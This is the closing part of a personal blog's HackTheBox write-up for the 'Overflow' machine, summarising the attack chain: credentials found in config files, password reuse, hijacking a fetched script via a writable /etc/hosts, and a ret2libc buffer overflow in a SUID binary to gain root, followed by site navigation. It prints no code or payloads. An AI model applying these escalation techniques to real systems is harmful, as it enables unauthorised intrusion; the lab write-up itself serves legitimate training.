      <li>Found 2 local users; <strong>developer</strong>, and <strong>tester</strong> (holds <code class="language-plaintext highlighter-rouge">user.txt</code>)</li>
      <li>Recovered MySQL credentials in config files of <strong>devbuild-job.overflow.htb</strong> domain.</li>
      <li>Gained access to account of <strong>developer</strong> due to password reuse.</li>
    </ul>
  </li>
  <li>Inside as <strong>developer</strong>
    <ul>
      <li>Identified a write access to <code class="language-plaintext highlighter-rouge">/etc/hosts</code></li>
      <li><code class="language-plaintext highlighter-rouge">pspy</code> showed requests to <code class="language-plaintext highlighter-rouge">http://taskmanage.overflow.htb/task.sh</code>, which I hijacked by editing the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file to gain code execution as <strong>tester</strong></li>
    </ul>
  </li>
  <li>Inside as <strong>tester</strong>
    <ul>
      <li>Found a SUID binary at <code class="language-plaintext highlighter-rouge">/opt/file_encrypt/file_encrypt</code></li>
      <li>Binary is protected by a PIN.</li>
      <li>Reversed the binary using <code class="language-plaintext highlighter-rouge">radare2</code> to extract the PIN.</li>
      <li>Identified a <em>buffer overflow</em> vulnerability in the binary.</li>
      <li>Performed a <em>ret2libc</em> attack to gain code execution as <strong>root</strong></li>
    </ul>
  </li>
</ul>


</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories --><div class="post-meta mb-3">
    <i class="far fa-folder-open fa-fw mr-1"></i><a href='/categories/hackthebox/'>hackthebox</a></div><!-- tags --><div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i><a href="/tags/hackthebox/"
          class="post-tag no-text-decoration" >hackthebox</a><a href="/tags/linux/"
          class="post-tag no-text-decoration" >linux</a><a href="/tags/hard/"
          class="post-tag no-text-decoration" >hard</a><a href="/tags/web/"
          class="post-tag no-text-decoration" >web</a><a href="/tags/smtp/"
          class="post-tag no-text-decoration" >smtp</a><a href="/tags/oracle-padding/"
          class="post-tag no-text-decoration" >oracle padding</a><a href="/tags/padbuster/"
          class="post-tag no-text-decoration" >padbuster</a><a href="/tags/execute-after-redirect/"
          class="post-tag no-text-decoration" >execute after redirect</a><a href="/tags/sql-injection/"
          class="post-tag no-text-decoration" >sql injection</a><a href="/tags/sqlmap/"
          class="post-tag no-text-decoration" >sqlmap</a><a href="/tags/john/"
          class="post-tag no-text-decoration" >john</a><a href="/tags/python/"
          class="post-tag no-text-decoration" >python</a><a href="/tags/exiftool/"
          class="post-tag no-text-decoration" >exiftool</a><a href="/tags/reverse-engineering/"
          class="post-tag no-text-decoration" >reverse engineering</a><a href="/tags/binary-exploitation/"
          class="post-tag no-text-decoration" >binary exploitation</a><a href="/tags/ret2libc/"
          class="post-tag no-text-decoration" >ret2libc</a><a href="/tags/nx/"
          class="post-tag no-text-decoration" >nx</a><a href="/tags/radare2/"
          class="post-tag no-text-decoration" >radare2</a></div><div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a> by the author.</div><!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons"><a href="https://twitter.com/intent/tweet?text=Overflow - HackTheBox - 4g3nt47&url=https://4g3nt47.github.io/posts/hackthebox/overflow.html" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a><a href="https://www.facebook.com/sharer/sharer.php?title=Overflow - HackTheBox - 4g3nt47&u=https://4g3nt47.github.io/posts/hackthebox/overflow.html" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a><a href="https://telegram.me/share?text=Overflow - HackTheBox - 4g3nt47&url=https://4g3nt47.github.io/posts/hackthebox/overflow.html" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a><i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copy link"
        title-succeed="Link copied successfully!">
    </i>

  </span>
</div>
</div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->

</div>
  </div> <!-- #core-wrapper -->

  <!-- pannel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

    <div class="access"><!--<div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3"><a class="post-tag" href="/tags/hackthebox/">hackthebox</a><a class="post-tag" href="/tags/linux/">linux</a><a class="post-tag" href="/tags/web/">web</a><a class="post-tag" href="/tags/command-injection/">command injection</a><a class="post-tag" href="/tags/dvwa/">dvwa</a><a class="post-tag" href="/tags/static-analysis/">static analysis</a><a class="post-tag" href="/tags/custom-exploitation/">custom exploitation</a><a class="post-tag" href="/tags/python/">python</a><a class="post-tag" href="/tags/sql-injection/">sql injection</a><a class="post-tag" href="/tags/sqlmap/">sqlmap</a></div>
  </div>-->
    </div><!-- BS-toc.js will be loaded at medium priority -->
<script src="/assets/js/bootstrap-toc.min.js"></script>

<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
  <div class="panel-heading pl-3 pt-2 mb-2">Contents</div>
  <nav id="toc" data-toggle="toc"></nav>
</div></div>

</div>

<!-- tail --><div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  --><!-- An random integer that bigger than 0  --><!-- Equals to TAG_SCORE / {max_categories_hierarchy}  --><!-- Fill with the other newlest posts  --><div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4"><div class="card">
        <a href="/posts/hackthebox/writer.html">
          <div class="card-body"><!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
--><em class="timeagosmall"
    date="2021-12-11 00:00:00 +0100">Dec 11, 2021</em>
<h3 class="pt-0 mt-1 mb-3" data-toc-skip>Writer - HackTheBox</h3>
            <div class="text-muted small">
              <p>Writer is definitely one of the toughest boxes I have ever solved at the time of writing this. It features a website that is vulnerable to SQL injection, which leads to authentication bypass. Once ...
              </p>
            </div>
          </div>
        </a>
      </div><div class="card">
        <a href="/posts/hackthebox/bountyhunter.html">
          <div class="card-body"><!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
--><em class="timeagosmall"
    date="2021-11-18 00:00:00 +0100">Nov 18, 2021</em>
<h3 class="pt-0 mt-1 mb-3" data-toc-skip>BountyHunter - HackTheBox</h3>
            <div class="text-muted small">
              <p>Another interesting easy linux box, Bounty Hunter is a box that features a web application that is vulnerable to XML External Entitiy injection. This flaw allows an attacker to read local files on ...
              </p>
            </div>
          </div>
        </a>
      </div><div class="card">
        <a href="/posts/hackthebox/previse.html">
          <div class="card-body"><!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
--><em class="timeagosmall"
    date="2022-01-16 00:00:00 +0100">Jan 16</em>
<h3 class="pt-0 mt-1 mb-3" data-toc-skip>Previse - HackTheBox</h3>
            <div class="text-muted small">
              <p>Previse is an easy linux box that I really enjoyed. It has an Execute After Redirect (EAR) vulnerability, whereby the application issues a redirect when an unauthenticated user is attempting to acc...
              </p>
            </div>
          </div>
        </a>
      </div></div> <!-- .card-deck -->
  </div> <!-- #related-posts --><!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between"><a href="/posts/hackthebox/shibboleth.html" class="btn btn-outline-primary"
    prompt="Older">
    <p>Shibboleth - HackTheBox</p>
  </a><a href="/posts/hackthebox/backdoor.html" class="btn btn-outline-primary"
    prompt="Newer">
    <p>Backdoor - HackTheBox</p>
  </a></div>
<!--  The comments switcher --></div>
  </div>
</div> <!-- .row --><!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center text-muted">
    <div class="footer-left">
      <p class="mb-0">
        © 2022
        <a href="https://twitter.com/UmarAbdoul">Umar Abdul</a>.<span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p>
    </div>

    <div class="footer-right">
      <p class="mb-0">Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.

      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>
</div><!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints"><div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3"><a class="post-tag" href="/tags/hackthebox/">hackthebox</a><a class="post-tag" href="/tags/linux/">linux</a><a class="post-tag" href="/tags/web/">web</a><a class="post-tag" href="/tags/command-injection/">command injection</a><a class="post-tag" href="/tags/dvwa/">dvwa</a><a class="post-tag" href="/tags/static-analysis/">static analysis</a><a class="post-tag" href="/tags/custom-exploitation/">custom exploitation</a><a class="post-tag" href="/tags/python/">python</a><a class="post-tag" href="/tags/sql-injection/">sql injection</a><a class="post-tag" href="/tags/sqlmap/">sqlmap</a></div>
  </div></div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>
</div> <!-- #main-wrapper --><div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a><!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
--><script src="/assets/js/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>
<!--
  JS selector for site.
-->

<!-- layout specified --><!-- image lazy-loading & popup -->
  <script src="/assets/js/clipboard.min.js"></script><script defer src="/assets/js/dist/post.min.js"></script><!-- commons -->

<script src="/assets/js/bootstrap.min.js"></script></body>

</html>
